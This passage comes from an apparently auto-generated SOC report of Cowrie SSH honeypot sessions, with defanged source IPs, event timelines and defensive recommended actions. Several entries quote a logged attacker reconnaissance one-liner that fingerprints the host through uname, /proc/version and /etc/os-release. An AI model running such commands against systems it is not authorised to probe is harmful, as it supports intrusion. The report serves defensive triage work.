| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:16:34` | `cowrie.session.connect` |
| `2026-07-28 21:16:35` | `cowrie.client.version` |
| `2026-07-28 21:16:35` | `cowrie.client.kex` |
| `2026-07-28 21:16:36` | `cowrie.login.success` |
| `2026-07-28 21:16:37` | `cowrie.direct-tcpip.request` |
| `2026-07-28 21:16:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.164.91[.]67` to AbuseIPDB if not already reported
- [ ] Block `39.164.91[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22686ec9ae67

| Field | Detail |
|---|---|
| **Source IP** | `111.17.213[.]162` |
| **First Seen** | 2026-07-28 21:16 |
| **Last Seen** | 2026-07-28 21:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:16:43` | `cowrie.session.connect` |
| `2026-07-28 21:16:44` | `cowrie.client.version` |
| `2026-07-28 21:16:44` | `cowrie.client.kex` |
| `2026-07-28 21:16:46` | `cowrie.login.success` |
| `2026-07-28 21:16:47` | `cowrie.direct-tcpip.request` |
| `2026-07-28 21:16:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.17.213[.]162` to AbuseIPDB if not already reported
- [ ] Block `111.17.213[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcc197f6b170

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-28 21:17 |
| **Last Seen** | 2026-07-28 21:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:17:44` | `cowrie.session.connect` |
| `2026-07-28 21:17:44` | `cowrie.client.version` |
| `2026-07-28 21:17:44` | `cowrie.client.kex` |
| `2026-07-28 21:17:44` | `cowrie.login.success` |
| `2026-07-28 21:17:44` | `cowrie.direct-tcpip.request` |
| `2026-07-28 21:17:44` | `cowrie.direct-tcpip.ja4` |
| `2026-07-28 21:17:44` | `cowrie.direct-tcpip.data` |
| `2026-07-28 21:17:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5f322bd430e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-28 21:18 |
| **Last Seen** | 2026-07-28 21:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:18:37` | `cowrie.session.connect` |
| `2026-07-28 21:18:37` | `cowrie.client.version` |
| `2026-07-28 21:18:37` | `cowrie.client.kex` |
| `2026-07-28 21:18:37` | `cowrie.login.success` |
| `2026-07-28 21:18:37` | `cowrie.direct-tcpip.request` |
| `2026-07-28 21:18:37` | `cowrie.direct-tcpip.ja4` |
| `2026-07-28 21:18:37` | `cowrie.direct-tcpip.data` |
| `2026-07-28 21:18:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c6c635ce76b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-28 21:20 |
| **Last Seen** | 2026-07-28 21:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:20:14` | `cowrie.session.connect` |
| `2026-07-28 21:20:14` | `cowrie.client.version` |
| `2026-07-28 21:20:14` | `cowrie.client.kex` |
| `2026-07-28 21:20:14` | `cowrie.login.success` |
| `2026-07-28 21:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bf3d23fdf12

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-28 21:20 |
| **Last Seen** | 2026-07-28 21:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:20:14` | `cowrie.session.connect` |
| `2026-07-28 21:20:14` | `cowrie.client.version` |
| `2026-07-28 21:20:14` | `cowrie.client.kex` |
| `2026-07-28 21:20:14` | `cowrie.login.success` |
| `2026-07-28 21:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc4d0515337f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-28 21:20 |
| **Last Seen** | 2026-07-28 21:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:20:19` | `cowrie.session.connect` |
| `2026-07-28 21:20:19` | `cowrie.client.version` |
| `2026-07-28 21:20:19` | `cowrie.client.kex` |
| `2026-07-28 21:20:19` | `cowrie.login.success` |
| `2026-07-28 21:20:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62ddcf35df4a

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-28 21:20 |
| **Last Seen** | 2026-07-28 21:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:20:19` | `cowrie.session.connect` |
| `2026-07-28 21:20:19` | `cowrie.client.version` |
| `2026-07-28 21:20:19` | `cowrie.client.kex` |
| `2026-07-28 21:20:19` | `cowrie.login.success` |
| `2026-07-28 21:20:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c7acfbe8d41

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 21:21 |
| **Last Seen** | 2026-07-28 21:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:21:09` | `cowrie.session.connect` |
| `2026-07-28 21:21:09` | `cowrie.client.version` |
| `2026-07-28 21:21:09` | `cowrie.client.kex` |
| `2026-07-28 21:21:09` | `cowrie.login.success` |
| `2026-07-28 21:21:09` | `cowrie.direct-tcpip.request` |
| `2026-07-28 21:21:10` | `cowrie.direct-tcpip.data` |
| `2026-07-28 21:21:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16720bd03d86

| Field | Detail |
|---|---|
| **Source IP** | `197.251.193[.]6` |
| **First Seen** | 2026-07-28 21:25 |
| **Last Seen** | 2026-07-28 21:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:25:33` | `cowrie.session.connect` |
| `2026-07-28 21:25:33` | `cowrie.client.version` |
| `2026-07-28 21:25:33` | `cowrie.client.kex` |
| `2026-07-28 21:25:35` | `cowrie.login.success` |
| `2026-07-28 21:25:35` | `cowrie.direct-tcpip.request` |
| `2026-07-28 21:25:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.251.193[.]6` to AbuseIPDB if not already reported
- [ ] Block `197.251.193[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6069d5008a7

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]131` |
| **First Seen** | 2026-07-28 21:25 |
| **Last Seen** | 2026-07-28 21:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:25:45` | `cowrie.session.connect` |
| `2026-07-28 21:25:45` | `cowrie.client.version` |
| `2026-07-28 21:25:45` | `cowrie.client.kex` |
| `2026-07-28 21:25:46` | `cowrie.login.success` |
| `2026-07-28 21:25:46` | `cowrie.direct-tcpip.request` |
| `2026-07-28 21:25:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]131` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]131` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a91bbe774738

| Field | Detail |
|---|---|
| **Source IP** | `122.187.227[.]145` |
| **First Seen** | 2026-07-28 21:28 |
| **Last Seen** | 2026-07-28 21:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:28:56` | `cowrie.session.connect` |
| `2026-07-28 21:28:57` | `cowrie.client.version` |
| `2026-07-28 21:28:57` | `cowrie.client.kex` |
| `2026-07-28 21:28:59` | `cowrie.login.success` |
| `2026-07-28 21:28:59` | `cowrie.direct-tcpip.request` |
| `2026-07-28 21:29:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.227[.]145` to AbuseIPDB if not already reported
- [ ] Block `122.187.227[.]145` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-449786b83a3a

| Field | Detail |
|---|---|
| **Source IP** | `111.70.29[.]158` |
| **First Seen** | 2026-07-28 21:29 |
| **Last Seen** | 2026-07-28 21:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:29:09` | `cowrie.session.connect` |
| `2026-07-28 21:29:10` | `cowrie.client.version` |
| `2026-07-28 21:29:10` | `cowrie.client.kex` |
| `2026-07-28 21:29:12` | `cowrie.login.success` |
| `2026-07-28 21:29:12` | `cowrie.direct-tcpip.request` |
| `2026-07-28 21:29:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.29[.]158` to AbuseIPDB if not already reported
- [ ] Block `111.70.29[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4099da8a233

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 21:33 |
| **Last Seen** | 2026-07-28 21:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:33:08` | `cowrie.session.connect` |
| `2026-07-28 21:33:09` | `cowrie.client.version` |
| `2026-07-28 21:33:09` | `cowrie.client.kex` |
| `2026-07-28 21:33:13` | `cowrie.login.success` |
| `2026-07-28 21:33:15` | `cowrie.session.params` |
| `2026-07-28 21:33:15` | `cowrie.command.input` |
| `2026-07-28 21:33:15` | `cowrie.command.input` |
| `2026-07-28 21:33:15` | `cowrie.command.input` |
| `2026-07-28 21:33:15` | `cowrie.command.input` |
| `2026-07-28 21:33:15` | `cowrie.command.input` |
| `2026-07-28 21:33:15` | `cowrie.command.success` |
| `2026-07-28 21:33:15` | `cowrie.command.input` |
| `2026-07-28 21:33:15` | `cowrie.command.input` |
| `2026-07-28 21:33:15` | `cowrie.command.input` |
| `2026-07-28 21:33:15` | `cowrie.command.input` |
| `2026-07-28 21:33:16` | `cowrie.log.closed` |
| `2026-07-28 21:33:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ec1863f6fb8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 21:34 |
| **Last Seen** | 2026-07-28 21:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:34:39` | `cowrie.session.connect` |
| `2026-07-28 21:34:39` | `cowrie.client.version` |
| `2026-07-28 21:34:39` | `cowrie.client.kex` |
| `2026-07-28 21:34:43` | `cowrie.login.success` |
| `2026-07-28 21:34:45` | `cowrie.session.params` |
| `2026-07-28 21:34:45` | `cowrie.command.input` |
| `2026-07-28 21:34:45` | `cowrie.command.input` |
| `2026-07-28 21:34:45` | `cowrie.command.input` |
| `2026-07-28 21:34:45` | `cowrie.command.input` |
| `2026-07-28 21:34:45` | `cowrie.command.input` |
| `2026-07-28 21:34:45` | `cowrie.command.success` |
| `2026-07-28 21:34:45` | `cowrie.command.input` |
| `2026-07-28 21:34:45` | `cowrie.command.input` |
| `2026-07-28 21:34:45` | `cowrie.command.input` |
| `2026-07-28 21:34:45` | `cowrie.command.input` |
| `2026-07-28 21:34:46` | `cowrie.log.closed` |
| `2026-07-28 21:34:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7f1608fa819

| Field | Detail |
|---|---|
| **Source IP** | `65.20.191[.]231` |
| **First Seen** | 2026-07-28 21:37 |
| **Last Seen** | 2026-07-28 21:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:37:18` | `cowrie.session.connect` |
| `2026-07-28 21:37:19` | `cowrie.client.version` |
| `2026-07-28 21:37:19` | `cowrie.client.kex` |
| `2026-07-28 21:37:21` | `cowrie.login.success` |
| `2026-07-28 21:37:22` | `cowrie.direct-tcpip.request` |
| `2026-07-28 21:37:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.191[.]231` to AbuseIPDB if not already reported
- [ ] Block `65.20.191[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90ea790754e2

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-07-28 21:37 |
| **Last Seen** | 2026-07-28 21:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:37:27` | `cowrie.session.connect` |
| `2026-07-28 21:37:28` | `cowrie.client.version` |
| `2026-07-28 21:37:28` | `cowrie.client.kex` |
| `2026-07-28 21:37:30` | `cowrie.login.success` |
| `2026-07-28 21:37:31` | `cowrie.direct-tcpip.request` |
| `2026-07-28 21:37:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb370466d2fb

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 21:37 |
| **Last Seen** | 2026-07-28 21:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:37:35` | `cowrie.session.connect` |
| `2026-07-28 21:37:36` | `cowrie.client.version` |
| `2026-07-28 21:37:36` | `cowrie.client.kex` |
| `2026-07-28 21:37:39` | `cowrie.login.success` |
| `2026-07-28 21:37:41` | `cowrie.session.params` |
| `2026-07-28 21:37:41` | `cowrie.command.input` |
| `2026-07-28 21:37:41` | `cowrie.command.input` |
| `2026-07-28 21:37:41` | `cowrie.command.input` |
| `2026-07-28 21:37:41` | `cowrie.command.input` |
| `2026-07-28 21:37:41` | `cowrie.command.input` |
| `2026-07-28 21:37:41` | `cowrie.command.success` |
| `2026-07-28 21:37:41` | `cowrie.command.input` |
| `2026-07-28 21:37:41` | `cowrie.command.input` |
| `2026-07-28 21:37:41` | `cowrie.command.input` |
| `2026-07-28 21:37:41` | `cowrie.command.input` |
| `2026-07-28 21:37:42` | `cowrie.log.closed` |
| `2026-07-28 21:37:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f91ac4e780e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 21:39 |
| **Last Seen** | 2026-07-28 21:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:39:02` | `cowrie.session.connect` |
| `2026-07-28 21:39:03` | `cowrie.client.version` |
| `2026-07-28 21:39:03` | `cowrie.client.kex` |
| `2026-07-28 21:39:06` | `cowrie.login.success` |
| `2026-07-28 21:39:08` | `cowrie.session.params` |
| `2026-07-28 21:39:08` | `cowrie.command.input` |
| `2026-07-28 21:39:08` | `cowrie.command.input` |
| `2026-07-28 21:39:08` | `cowrie.command.input` |
| `2026-07-28 21:39:08` | `cowrie.command.input` |
| `2026-07-28 21:39:08` | `cowrie.command.input` |
| `2026-07-28 21:39:08` | `cowrie.command.success` |
| `2026-07-28 21:39:08` | `cowrie.command.input` |
| `2026-07-28 21:39:08` | `cowrie.command.input` |
| `2026-07-28 21:39:08` | `cowrie.command.input` |
| `2026-07-28 21:39:08` | `cowrie.command.input` |
| `2026-07-28 21:39:09` | `cowrie.log.closed` |
| `2026-07-28 21:39:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a482fbdb4d6

| Field | Detail |
|---|---|
| **Source IP** | `111.70.11[.]38` |
| **First Seen** | 2026-07-28 21:39 |
| **Last Seen** | 2026-07-28 21:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:39:39` | `cowrie.session.connect` |
| `2026-07-28 21:39:40` | `cowrie.client.version` |
| `2026-07-28 21:39:40` | `cowrie.client.kex` |
| `2026-07-28 21:39:42` | `cowrie.login.success` |
| `2026-07-28 21:39:43` | `cowrie.direct-tcpip.request` |
| `2026-07-28 21:39:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.11[.]38` to AbuseIPDB if not already reported
- [ ] Block `111.70.11[.]38` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a36abd54d2e0

| Field | Detail |
|---|---|
| **Source IP** | `42.200.60[.]186` |
| **First Seen** | 2026-07-28 21:39 |
| **Last Seen** | 2026-07-28 21:39 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:39:48` | `cowrie.session.connect` |
| `2026-07-28 21:39:50` | `cowrie.client.version` |
| `2026-07-28 21:39:50` | `cowrie.client.kex` |
| `2026-07-28 21:39:52` | `cowrie.login.success` |
| `2026-07-28 21:39:53` | `cowrie.direct-tcpip.request` |
| `2026-07-28 21:39:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.60[.]186` to AbuseIPDB if not already reported
- [ ] Block `42.200.60[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4273c8479fb0

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 21:40 |
| **Last Seen** | 2026-07-28 21:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
